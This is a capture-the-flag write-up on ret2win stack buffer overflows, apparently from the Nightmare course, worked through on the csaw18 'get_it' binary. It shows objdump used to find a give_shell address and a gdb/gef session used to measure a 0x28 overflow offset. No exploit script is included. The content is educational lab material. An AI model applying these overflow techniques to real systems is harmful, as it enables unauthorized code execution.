All of these challenges are very similar so theirs no point in have 4 of the same writeups.
The general idea behind these challenges includes using a buffer overflow to overwrite a certain value to get a flag or a shell. This is usually done in a controlled manner by counting the offset in gdb and then writing the exact address. 

## How to get the address of a function
Sometimes we know which function we want to jump to because they will give us a shell or cat the flag. To find the address we just need to run the following command 
```bash 
objdump -d <binary name> | grep <Func Name>
```
EX: In csaw18_geit we can run the following command to get the address of the function. 
```bash 
 ~/turbo-octo-pancake/N/s/r/csaw18_gedit    main  objdump -d get_it| grep shell 
00000000004005b6 <give_shell>:
```
## How to find offset for overflow

This differs depending on what you are trying to do but this technique works most of the time. First, we open the file in gdb and then enter in a recognizable string to find. Once the program breaks as can use search-pattern to find the address of that string on the stack. Then we run info frame to find the address that the instruction pointer points to. We then subtract the two values to find the offset 
EX: Csaw18_Getit- Offset is 0x28
```gdb
gef➤  disassemble main
Dump of assembler code for function main:
   0x00000000004005c7 <+0>:     push   rbp
   0x00000000004005c8 <+1>:     mov    rbp,rsp
   0x00000000004005cb <+4>:     sub    rsp,0x30
   0x00000000004005cf <+8>:     mov    DWORD PTR [rbp-0x24],edi
   0x00000000004005d2 <+11>:    mov    QWORD PTR [rbp-0x30],rsi
   0x00000000004005d6 <+15>:    mov    edi,0x40068e
   0x00000000004005db <+20>:    call   0x400470 <puts@plt>
   0x00000000004005e0 <+25>:    lea    rax,[rbp-0x20]
   0x00000000004005e4 <+29>:    mov    rdi,rax
   0x00000000004005e7 <+32>:    mov    eax,0x0
   0x00000000004005ec <+37>:    call   0x4004a0 <gets@plt>
   0x00000000004005f1 <+42>:    mov    eax,0x0
   0x00000000004005f6 <+47>:    leave
   0x00000000004005f7 <+48>:    ret
End of assembler dump.
gef➤  break *0x00000000004005f1
Breakpoint 1 at 0x4005f1
gef➤  run
Starting program: /home/ex4722/turbo-octo-pancake/Nightmare/stack_smashing/ret2win/csaw18_gedit/get_it
Do you gets it??
STRING123

Breakpoint 1, 0x00000000004005f1 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffd9d0  →  "STRING123"
$rbx   : 0x0000000000400600  →  <__libc_csu_init+0> push r15
$rcx   : 0x00007ffff7f99800  →  0x00000000fbad2288
$rdx   : 0x0
$rsp   : 0x00007fffffffd9c0  →  0x00007fffffffdae8  →  0x00007fffffffde83  →  "/home/ex4722/turbo-octo-pancake/Nightmare/stack_sm[...]"
$rbp   : 0x00007fffffffd9f0  →  0x0000000000000000
$rsi   : 0x333231474e495254 ("TRING123"?)
$rdi   : 0x00007ffff7f9c4e0  →  0x0000000000000000
$rip   : 0x00000000004005f1  →  <main+42> mov eax, 0x0
$r8    : 0x00007fffffffd9d0  →  "STRING123"
$r9    : 0x0
$r10   : 0x77
$r11   : 0x246
$r12   : 0x00000000004004c0  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd9c0│+0x0000: 0x00007fffffffdae8  →  0x00007fffffffde83  →  "/home/ex4722/turbo-octo-pancake/Nightmare/stack_sm[...]"      ← $rsp
0x00007fffffffd9c8│+0x0008: 0x0000000100400600
0x00007fffffffd9d0│+0x0010: "STRING123"  ← $rax, $r8
0x00007fffffffd9d8│+0x0018: 0x0000000000400033  →   add BYTE PTR [rax+0x0], al
0x00007fffffffd9e0│+0x0020: 0x00007fffffffdae0  →  0x0000000000000001
0x00007fffffffd9e8│+0x0028: 0x0000000000000000
0x00007fffffffd9f0│+0x0030: 0x0000000000000000   ← $rbp
0x00007fffffffd9f8│+0x0038: 0x00007ffff7e00b25  →  <__libc_start_main+213> mov edi, eax
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005e4 <main+29>        mov    rdi, rax
     0x4005e7 <main+32>        mov    eax, 0x0
     0x4005ec <main+37>        call   0x4004a0 <gets@plt>
 →   0x4005f1 <main+42>        mov    eax, 0x0
     0x4005f6 <main+47>        leave
     0x4005f7 <main+48>        ret
     0x4005f8                  nop    DWORD PTR [rax+rax*1+0x0]
     0x400600 <__libc_csu_init+0> push   r15
     0x400602 <__libc_csu_init+2> push   r14
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005f1 in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005f1 → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern STRING123
[+] Searching 'STRING123' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x6026b0 - 0x6026bb  →   "STRING123\n"
[+] In '[stack]'(0x7ffffffdd000-0x7ffffffff000), permission=rw-
  0x7fffffffd9d0 - 0x7fffffffd9d9  →   "STRING123"
gef➤  info frame
Stack level 0, frame at 0x7fffffffda00:
 rip = 0x4005f1 in main; saved rip = 0x7ffff7e00b25
 Arglist at 0x7fffffffd9f0, args:
 Locals at 0x7fffffffd9f0, Previous frame's sp is 0x7fffffffda00
 Saved registers:
  rbp at 0x7fffffffd9f0, rip at 0x7fffffffd9f8
### 0x7fffffffd9d0 - 0x7fffffffd9f8  = 0x28
```
